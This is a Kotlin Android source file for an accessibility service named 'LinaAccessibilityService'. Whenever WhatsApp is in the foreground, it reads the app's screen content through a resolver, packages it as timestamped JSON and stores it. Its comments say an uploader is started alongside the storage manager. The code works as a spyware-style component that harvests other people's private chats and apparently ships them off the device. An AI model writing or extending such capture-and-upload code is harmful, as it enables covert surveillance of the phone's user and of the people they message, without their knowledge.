package com.example.lina

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.example.lina.resolvers.WhatsAppResolver
import com.example.lina.storage.StorageManager
import org.json.JSONObject

class LinaAccessibilityService : AccessibilityService() {

    private val tag = "LinaResolver"

    override fun onServiceConnected() {
        super.onServiceConnected()
        // Re-inicializa o gerenciador de armazenamento, que por sua vez inicia o uploader.
        StorageManager.init(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString()
        if (packageName == null) return

        val rootNode = rootInActiveWindow ?: return

        val resolvedData: JSONObject? = when (packageName) {
            "com.whatsapp" -> WhatsAppResolver.resolve(rootNode)
            else -> null
        }

        rootNode.recycle()

        if (resolvedData != null) {
            val payload = JSONObject().apply {
                put("packageName", packageName)
                put("eventType", AccessibilityEvent.eventTypeToString(event.eventType))
                put("timestamp", System.currentTimeMillis())
                put("data", resolvedData)
            }
            // A linha de Log.d permanece comentada, e o savePayload agora funcionará.
            // Log.d(tag, "Generated JSON: \n${payload.toString(4)}")
            StorageManager.savePayload(payload)
        }
    }

    override fun onInterrupt() {
        //super.onInterrupt()
        // Garante que o uploader seja parado quando o serviço é interrompido.
        StorageManager.shutdown()
    }

    override fun onDestroy() {
        super.onDestroy()
        // Garante que o uploader seja parado quando o serviço for destruído.
        StorageManager.shutdown()
    }
}
